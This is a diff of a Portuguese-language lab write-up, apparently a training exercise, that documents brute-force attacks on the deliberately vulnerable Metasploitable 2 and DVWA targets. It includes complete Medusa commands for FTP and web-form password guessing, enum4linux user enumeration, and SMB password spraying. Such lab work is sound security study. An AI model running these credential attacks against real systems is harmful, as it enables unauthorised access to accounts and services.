@@ -28,26 +28,26 @@ Configuração de Rede (Bridge).
 Foi criada uma seção para cada serviço atacado (FTP, Web - DVWA, SMB).
 
 A. Ataque a FTP (Serviço vsftpd do Metasploitable 2)
-# comando: medusa -h 192.168.1.7 -u msfadmin -P pass.txt -M ftp
-# -h: Host Alvo
-# -u: Usuário (ou -U para lista de usuários)
-# -P: Wordlist de Senhas
-# -M: Módulo/Serviço a ser atacado (ftp)
+ comando: medusa -h 192.168.1.7 -u msfadmin -P pass.txt -M ftp
+ -h: Host Alvo
+ -u: Usuário (ou -U para lista de usuários)
+ -P: Wordlist de Senhas
+ -M: Módulo/Serviço a ser atacado (ftp)
 
 
 B. Ataque a Formulário Web (DVWA)
-# comando: medusa -h 192.168.1.7 -M http -m "Location: index.php" -u "admin" -P wordlist-pass.txt -d "username=^USER^&password=^PASS^&Login=Login" -t 5 -T 1
-# -H: Cabeçalho
-# -d: Dados do POST, onde ^USER^ e ^PASS^ são os placeholders
-# -m: Mensagem de erro (para saber quando falhou)
+ comando: medusa -h 192.168.1.7 -M http -m "Location: index.php" -u "admin" -P wordlist-pass.txt -d "username=^USER^&password=^PASS^&Login=Login" -t 5 -T 1
+ -H: Cabeçalho
+ -d: Dados do POST, onde ^USER^ e ^PASS^ são os placeholders
+ -m: Mensagem de erro (para saber quando falhou)
 
 C. Ataque a SMB (Enumeração de Usuários e Password Spraying)
-# comando: enum4linux 192.168.1.10
-# Encontra usuários existentes no serviço SMB
+ comando: enum4linux 192.168.1.10
+ Encontra usuários existentes no serviço SMB
 
-# comando: medusa -h 192.168.1.7 -U smb_users.txt -p 'password' -M smb
-# -U: Lista de Usuários
-# -p: Senha única (para password spraying)
+ comando: medusa -h 192.168.1.7 -U smb_users.txt -p 'password' -M smb
+ -U: Lista de Usuários
+ -p: Senha única (para password spraying)
 
 # Wordlists Utilizadas:
 pass.txt, users.txt, senhas_spray.txt, smb_users.txt.
